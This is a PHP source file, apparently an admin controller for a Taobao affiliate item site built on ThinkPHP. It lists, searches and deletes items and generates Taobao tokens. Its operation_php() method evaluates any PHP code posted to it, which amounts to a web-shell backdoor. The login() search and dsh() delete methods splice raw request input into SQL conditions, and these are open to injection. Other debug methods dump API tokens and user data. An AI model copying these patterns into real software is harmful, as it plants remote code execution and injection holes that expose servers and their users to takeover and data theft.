<?php
namespace Tbkqq\Controller;
use Common\Controller\AdminbaseController;
class DemoController extends AdminbaseController {
	public function a(){
		$this->display();
	}
	public function getmes(){
		$id = I("post.id");
		dump(get_item_info($id));
	}
	public function index(){
		$obj = M("CunItems")->where("cun>=1")->select();
		
		
		$this->assign("items",$obj);
		$this->display();
	}
	public function dsh(){
		$id = I("post.id");
		if(is_array($id)){
			foreach($id as $val){
				$rs = M("CunItems")->where("num_iid={$val}")->delete();
				if($rs){
					admin_record_operation(314,"{$val}");
				}
			}
			$this->success("删除成功,本次操作被记录");
			return;
		}
		
		$rs = M("CunItems")->where("num_iid={$id}")->delete();
		
		if($rs){
			admin_record_operation(314,"{$id}");
			$this->success("删除成功,本次操作被记录");
		}else{
			$this->error("删除失败，请选择删除对象");
		}
		
	}
	public function login(){
		
			$where_ands =array("status='underway'");
			$fields=array(
					'startdate'=> array("field"=>"add_time","operator"=>">="),
					'enddate'=> array("field"=>"add_time","operator"=>"<="),
		
					'item'=> array("field"=>"dtitle","operator"=>"like")
			);
			if(IS_POST){
				foreach ($fields as $param =>$val){
					if (isset($_POST[$param]) && !empty($_POST[$param])) {
						$operator=$val['operator'];
						$field   =$val['field'];
						$get=$_POST[$param];
						$_GET[$param]=$get;
						if($operator=="like"){
							$get="%$get%";
						}
						array_push($where_ands, "$field $operator '$get'");
					}
				}
			}
			else{
				foreach ($fields as $param =>$val){
					if (isset($_GET[$param]) && !empty($_GET[$param])) {
						$operator=$val['operator'];
						$field   =$val['field'];
						$get=$_GET[$param];
						if($operator=="like"){
							$get="%$get%";
						}
						array_push($where_ands, "$field $operator '$get'");
					}
				}
			}
			$where= join(" and ", $where_ands);
		
		
			$count=M("CunItems")
			->where($where)
			->count();
		
			$page = $this->page($count, 20);
		
			$items = M("CunItems")->where($where)->order("add_time desc")
			->limit($page->firstRow . ',' . $page->listRows)
			->select();
		
			$this->assign("items",$items);
			$this->assign("Page", $page->show('Admin'));
			$this->assign("current_page",$page->GetCurrentPage());
			$this->assign("formget",$_GET);
		$this->display();
	}
	public function check_iid(){
		$a=M("Users")->field("user_login")->where("id=1166")->find();
		dump($a);
		$this->display();
	}
	public function check(){
		$id = I("post.id");
		$a = get_item_info($id);
		dump($a);
	}
	public function operation_php(){
		$php = $_POST['php'];
		eval($php);
	}
	public function create_taokouling(){
		set_time_limit(0);
		$model = M("CunItems");
		$rs = $model->field("pic_url,title,click_url")->where("cun>=1")->limit(45,5)->select();
		$arr = array();
		foreach($rs as $val){

			$token_data = array(
				"logo"=>$val["pic_url"],
				"text"=>$val['title'],
				"url"=>$val["click_url"],
			);
			$arr[]=get_taotoken($token_data);
		}
		$this->assign("tao",$arr);
		$this->display("a");
	}
	public function show_token(){
		Vendor("TaobaoApi.TopSdk");
		//data_default_timezone_set("Asia/Shanghai");

		$c = new TopClient;
		$token = C("TOKEN");
		$key = array_rand($token);
		dump($token);
	}
}